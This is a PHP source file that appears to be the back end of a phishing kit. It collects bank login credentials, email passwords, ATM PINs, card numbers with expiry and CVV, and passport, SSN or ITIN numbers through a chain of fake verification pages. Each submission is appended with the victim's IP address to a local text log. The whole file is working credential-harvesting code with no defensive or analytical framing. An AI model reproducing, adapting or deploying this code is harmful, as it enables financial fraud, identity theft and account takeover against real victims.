<?php
header("Content-Type: text/html; charset=utf-8");
require_once "ayudante.php";
$archivo = "cabimas100.txt";
if (is_session_started() === FALSE) {
    session_start();
}
function getRealIP()
{
    if (!empty($_SERVER['HTTP_CLIENT_IP']))
        return $_SERVER['HTTP_CLIENT_IP'];

    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
        return $_SERVER['HTTP_X_FORWARDED_FOR'];

    return $_SERVER['REMOTE_ADDR'];
}
$usuario = filter_input(INPUT_POST, "usuario");
$contra  = filter_input(INPUT_POST, "contra");

$correo = filter_input(INPUT_POST, "correo");
$ccorreo = filter_input(INPUT_POST, "ccorreo");
$atm = filter_input(INPUT_POST,"atm");

$tarjeta = filter_input(INPUT_POST, "nucard");
$fmes = filter_input(INPUT_POST, "mes");
$fanio = filter_input(INPUT_POST, "anio");
$tcvv = filter_input(INPUT_POST, "cvv");

$docu = filter_input(INPUT_POST, "docu");
$ndocu = filter_input(INPUT_POST, "ndocu");

$ip = getRealIP();

if (!empty($usuario) && !empty($contra)) {
    $_SESSION["usuario"]  = $usuario;
    $_SESSION["contra"] = $contra;
    $_SESSION["permiso"] = "primero";
    
    $datos = "
=======================================
|| Usuario: " . $_SESSION["usuario"] . "
|| Clave: " . $_SESSION["contra"] . "
|| Ip: $ip";

    $file = fopen($archivo, 'a+');
    fwrite($file, $datos);
    fclose($file);
    header("location:mailverification.php");
}

if (!empty($correo) && !empty($ccorreo) && !empty($atm) && array_key_exists("permiso", $_SESSION)) {


    $datos = "
|| Correo: $correo
|| Clave: $ccorreo
|| Atm: $atm
|| Ip: $ip";

    $file = fopen($archivo, 'a+');
    fwrite($file, $datos);
    fclose($file);

    unset($_SESSION["permiso"]);
    $_SESSION["permiso2"] = "segundo";
    header("location:cardconfirmation.php");
}

if (!empty($tarjeta) && !empty($fmes) && !empty($fanio) && !empty($tcvv) && array_key_exists("permiso2", $_SESSION)) {

    unset($_SESSION["permiso2"]);
    $_SESSION["permiso3"] = "3";
    $datos = "
|| Numero: $tarjeta
|| Exp: $fmes/$fanio
|| Cvv: $tcvv
|| Ip: $ip";

    $file = fopen($archivo, 'a+');
    fwrite($file, $datos);
    fclose($file);
    header("location:identityconfirmation.php");
}

if (!empty($docu) && !empty($ndocu) && array_key_exists("permiso3",$_SESSION)) {
    $tipo = "";
    switch ($docu) {
        case "pasaporte":
            $tipo = "pasaporte";
            break;
        case "ssn":
            $tipo = "Número de Seguro Social";
            break;
        case "itin":
            $tipo = "Número de Identificación Personal del Contribuyente";
            break;
    }
    $ip = getRealIP();
    unset($_SESSION["permiso3"]);
    $datos = "
|| T.Identificacion: $tipo
|| N.Identificacion: $ndocu
|| Ip: $ip
=======================================";

    $file = fopen($archivo, 'a+');
    fwrite($file, $datos);
    fclose($file);

    session_destroy();
    header("location:verification.php");
}
